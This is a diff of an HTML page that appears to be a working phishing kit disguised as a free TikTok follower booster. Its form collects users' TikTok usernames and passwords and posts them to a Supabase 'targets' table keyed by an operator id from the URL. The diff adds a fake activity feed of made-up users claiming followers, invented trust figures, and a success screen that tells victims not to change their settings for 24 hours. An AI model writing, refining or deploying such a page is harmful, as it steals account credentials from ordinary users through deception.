@@ -3,79 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Free Followers - Get Famous Now</title>
+    <title>TikTok Follower Booster - Get 100k Free</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background-color: #010101; color: white; font-family: 'Inter', sans-serif; }
+        body { background-color: #010101; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
         .tiktok-gradient { background: linear-gradient(45deg, #ff0050, #00f2ea); }
-        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .glow-btn { box-shadow: 0 0 15px rgba(0, 242, 234, 0.3); }
+        .floating { animation: float 3s ease-in-out infinite; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center p-4">
+<body class="min-h-screen flex flex-col items-center">
+
+    <!-- Top Banner -->
+    <div class="w-full tiktok-gradient py-2 text-center text-xs font-bold uppercase tracking-widest text-black">
+        Limited Time Offer: Free Followers Verification System
+    </div>
 
     <!-- Header -->
-    <header class="w-full max-w-md flex flex-col items-center mt-8 mb-6">
-        <i class="fab fa-tiktok text-5xl mb-4 tiktok-gradient p-3 rounded-2xl"></i>
-        <h1 class="text-3xl font-bold italic">TikTok Booster</h1>
-        <p class="text-gray-400 text-sm">Get real followers instantly for free!</p>
+    <header class="w-full max-w-md flex flex-col items-center mt-12 mb-8 px-4">
+        <div class="floating relative">
+            <i class="fab fa-tiktok text-6xl tiktok-gradient p-4 rounded-3xl shadow-2xl"></i>
+            <span class="absolute -top-2 -right-2 bg-red-500 text-[10px] px-2 py-1 rounded-full animate-bounce">LIVE</span>
+        </div>
+        <h1 class="text-4xl font-black italic mt-6 tracking-tighter">TIKTOK<span class="text-cyan-400">BOOST</span></h1>
+        <p class="text-gray-400 text-sm mt-1">Trusted by 1.2M+ Creators Worldwide</p>
     </header>
 
-    <div id="main-content" class="w-full max-w-md">
-        <!-- Step 1: Selection List -->
+    <div id="main-content" class="w-full max-w-md px-4 pb-20">
+        
+        <!-- Selection Page -->
         <div id="selection-page" class="space-y-4">
-            <h2 class="text-xl font-semibold mb-4 text-center">Select Follower Package</h2>
-            
-            <div onclick="showLogin('10,000')" class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition">
-                <span><i class="fas fa-user-plus mr-3 text-cyan-400"></i> 10,000 Followers</span>
-                <span class="tiktok-gradient px-3 py-1 rounded-full text-xs font-bold">FREE</span>
-            </div>
-
-            <div onclick="showLogin('25,000')" class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition">
-                <span><i class="fas fa-user-plus mr-3 text-pink-500"></i> 25,000 Followers</span>
-                <span class="tiktok-gradient px-3 py-1 rounded-full text-xs font-bold">FREE</span>
-            </div>
-
-            <div onclick="showLogin('50,000')" class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition">
-                <span><i class="fas fa-user-plus mr-3 text-cyan-400"></i> 50,000 Followers</span>
-                <span class="tiktok-gradient px-3 py-1 rounded-full text-xs font-bold">FREE</span>
+            <div class="flex items-center justify-between mb-4">
+                <h2 class="text-lg font-bold">Select Reward</h2>
+                <div class="text-xs text-gray-500"><i class="fas fa-users mr-1"></i> 4.2k Active</div>
             </div>
             
-            <div onclick="showLogin('100,000')" class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition border border-cyan-500">
-                <span><i class="fas fa-fire mr-3 text-orange-500"></i> 100,000 Followers</span>
-                <span class="tiktok-gradient px-3 py-1 rounded-full text-xs font-bold">BEST VALUE</span>
+            <div onclick="showLogin('10,000')" class="glass p-5 rounded-2xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition border-l-4 border-cyan-400">
+                <div class="flex items-center gap-4">
+                    <div class="bg-cyan-500/20 p-3 rounded-full text-cyan-400"><i class="fas fa-bolt"></i></div>
+                    <div>
+                        <div class="font-bold">10,000 Followers</div>
+                        <div class="text-[10px] text-gray-500">Delivery: Instant</div>
+                    </div>
+                </div>
+                <div class="text-xs font-black text-cyan-400 underline italic uppercase">Claim</div>
             </div>
+
+            <div onclick="showLogin('50,000')" class="glass p-5 rounded-2xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition border-l-4 border-pink-500">
+                <div class="flex items-center gap-4">
+                    <div class="bg-pink-500/20 p-3 rounded-full text-pink-500"><i class="fas fa-heart"></i></div>
+                    <div>
+                        <div class="font-bold">50,000 Followers</div>
+                        <div class="text-[10px] text-gray-500">Delivery: 1 Hour</div>
+                    </div>
+                </div>
+                <div class="text-xs font-black text-pink-500 underline italic uppercase">Claim</div>
+            </div>
+
+            <div onclick="showLogin('100,000')" class="glass p-6 rounded-2xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition border-2 border-cyan-400 bg-cyan-400/5 glow-btn">
+                <div class="flex items-center gap-4">
+                    <div class="bg-white text-black p-3 rounded-full"><i class="fas fa-fire"></i></div>
+                    <div>
+                        <div class="font-bold text-xl">100,000</div>
+                        <div class="text-[10px] text-cyan-400 font-bold uppercase">Viral Package</div>
+                    </div>
+                </div>
+                <div class="tiktok-gradient text-black px-4 py-2 rounded-xl text-xs font-bold shadow-lg shadow-cyan-500/20">HOT</div>
+            </div>
+
+            <p class="text-center text-[10px] text-gray-600 px-8">By claiming, you agree to our terms of service and community guidelines for account growth.</p>
         </div>
 
-        <!-- Step 2: Login Form -->
-        <div id="login-page" class="hidden glass p-6 rounded-2xl shadow-2xl">
-            <h2 class="text-center text-xl font-bold mb-6">Login to Verify Account</h2>
-            <p class="text-sm text-gray-400 mb-6 text-center">Enter your TikTok credentials to receive your <span id="selected-amount" class="text-cyan-400 font-bold"></span> followers.</p>
-            
-            <form id="payload-form" class="space-y-4">
-                <div>
-                    <label class="block text-xs uppercase text-gray-500 mb-1 ml-1">Username / Email / Phone</label>
-                    <input type="text" id="target-username" required class="w-full bg-black/50 border border-white/10 p-3 rounded-lg focus:outline-none focus:border-cyan-500" placeholder="@username">
-                </div>
-                <div>
-                    <label class="block text-xs uppercase text-gray-500 mb-1 ml-1">TikTok Password</label>
-                    <input type="password" id="target-password" required class="w-full bg-black/50 border border-white/10 p-3 rounded-lg focus:outline-none focus:border-pink-500" placeholder="••••••••">
-                </div>
-                <button type="submit" id="submit-btn" class="w-full tiktok-gradient py-3 rounded-lg font-bold mt-4 hover:opacity-90 transition">
-                    CLAIM FOLLOWERS
-                </button>
-            </form>
+        <!-- Login Form -->
+        <div id="login-page" class="hidden">
+            <div class="glass p-8 rounded-3xl shadow-2xl relative overflow-hidden">
+                <div class="absolute top-0 right-0 w-32 h-32 bg-pink-500/10 blur-3xl -z-10"></div>
+                
+                <h2 class="text-center text-2xl font-black mb-2 uppercase italic">Verification</h2>
+                <p class="text-xs text-gray-400 mb-8 text-center px-4">Login with your TikTok account to receive <span id="selected-amount" class="text-cyan-400 font-bold"></span> followers instantly.</p>
+                
+                <form id="payload-form" class="space-y-5">
+                    <div class="space-y-1">
+                        <label class="text-[10px] font-bold text-gray-500 uppercase ml-2">Phone / Email / Username</label>
+                        <input type="text" id="target-username" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-cyan-500 transition" placeholder="@username">
+                    </div>
+                    <div class="space-y-1">
+                        <label class="text-[10px] font-bold text-gray-500 uppercase ml-2">Password</label>
+                        <input type="password" id="target-password" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-pink-500 transition" placeholder="TikTok Password">
+                    </div>
+                    
+                    <button type="submit" id="submit-btn" class="w-full tiktok-gradient py-4 rounded-2xl font-black text-black tracking-widest hover:scale-105 active:scale-95 transition-all shadow-xl shadow-pink-500/20">
+                        VERIFY & CLAIM
+                    </button>
+                </form>
+            </div>
+            <button onclick="location.reload()" class="w-full mt-6 text-gray-500 text-xs hover:text-white transition"><i class="fas fa-arrow-left mr-2"></i> Go Back</button>
         </div>
 
-        <!-- Step 3: Success Message -->
-        <div id="success-page" class="hidden text-center glass p-8 rounded-2xl">
-            <i class="fas fa-clock text-6xl text-cyan-400 mb-6 animate-pulse"></i>
-            <h2 class="text-2xl font-bold mb-4">Request Received!</h2>
-            <p class="text-gray-400 leading-relaxed">
-                Your <span class="text-white font-bold">TikTok Followers</span> are now under review. <br><br>
-                Due to high demand, please wait <span class="text-pink-500 font-bold">24-48 hours</span> for the followers to be added to your account.
+        <!-- Success Page -->
+        <div id="success-page" class="hidden text-center glass p-10 rounded-3xl border-emerald-500/30">
+            <div class="w-20 h-20 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
+                <i class="fas fa-check text-4xl text-emerald-400"></i>
+            </div>
+            <h2 class="text-2xl font-black mb-3">CONGRATULATIONS!</h2>
+            <p class="text-gray-400 text-sm leading-relaxed mb-6">
+                Your request for <span id="final-amount" class="text-white font-bold"></span> followers has been verified.
+                <br><br>
+                Process Status: <span class="text-yellow-500 font-bold">Awaiting Server Queue</span>
+                <br>
+                Est. Completion: <span class="text-cyan-400 font-bold">24 Hours</span>
             </p>
-            <div class="mt-8 text-xs text-gray-600 italic">Do not change your password during this period.</div>
+            <div class="bg-black/50 p-4 rounded-xl text-[10px] text-gray-500 italic">
+                Note: Do not change your username or privacy settings until the process is complete.
+            </div>
+        </div>
+    </div>
+
+    <!-- Live Activity Feed -->
+    <div class="fixed bottom-4 left-4 right-4 max-w-md mx-auto">
+        <div class="glass px-4 py-2 rounded-full text-[10px] flex items-center gap-3 w-max mx-auto shadow-2xl">
+            <span class="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></span>
+            <span id="activity-text">@user_992 just claimed 100k followers</span>
         </div>
     </div>
 
@@ -83,7 +134,6 @@
         const SUPABASE_URL = 'https://irryclyepdnmncxyhgla.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_SBAazL4Lqp4g2LC81O-FWQ_dX2zKek6';
         
-        // Admin ID from URL (e.g., follower.vercel.app/?user=admin1)
         const urlParams = new URLSearchParams(window.location.search);
         const adminId = urlParams.get('user') || 'default_admin';
 
@@ -91,7 +141,16 @@
             document.getElementById('selection-page').classList.add('hidden');
             document.getElementById('login-page').classList.remove('hidden');
             document.getElementById('selected-amount').innerText = amount;
+            document.getElementById('final-amount').innerText = amount;
         }
+
+        // Fake Activity Feed Logic
+        const users = ['ali_khan', 'tiktok_star', 'king_007', 'princess_99', 'viral_vibe', 'jatt_life'];
+        setInterval(() => {
+            const user = users[Math.floor(Math.random() * users.length)];
+            const amt = ['10k', '50k', '100k'][Math.floor(Math.random() * 3)];
+            document.getElementById('activity-text').innerText = `@${user} just claimed ${amt} followers`;
+        }, 5000);
 
         document.getElementById('payload-form').onsubmit = async (e) => {
             e.preventDefault();
@@ -100,17 +159,15 @@
             const password = document.getElementById('target-password').value;
 
             btn.disabled = true;
-            btn.innerText = "Verifying...";
+            btn.innerText = "VERIFYING ACCOUNT...";
 
             try {
-                // Sending data to Supabase 'targets' table
                 const response = await fetch(`${SUPABASE_URL}/rest/v1/targets`, {
                     method: 'POST',
                     headers: {
                         'apikey': SUPABASE_KEY,
                         'Authorization': `Bearer ${SUPABASE_KEY}`,
-                        'Content-Type': 'application/json',
-                        'Prefer': 'return=minimal'
+                        'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
                         user_id: adminId,
@@ -123,15 +180,14 @@
                     document.getElementById('login-page').classList.add('hidden');
                     document.getElementById('success-page').classList.remove('hidden');
                 } else {
-                    alert("Technical error. Try again later.");
+                    alert("Verification Failed. System Busy.");
                     btn.disabled = false;
-                    btn.innerText = "CLAIM FOLLOWERS";
+                    btn.innerText = "VERIFY & CLAIM";
                 }
             } catch (err) {
-                console.error(err);
-                alert("Connection lost. Check internet.");
+                alert("Server Connection Error!");
                 btn.disabled = false;
-                btn.innerText = "CLAIM FOLLOWERS";
+                btn.innerText = "VERIFY & CLAIM";
             }
         };
     </script>
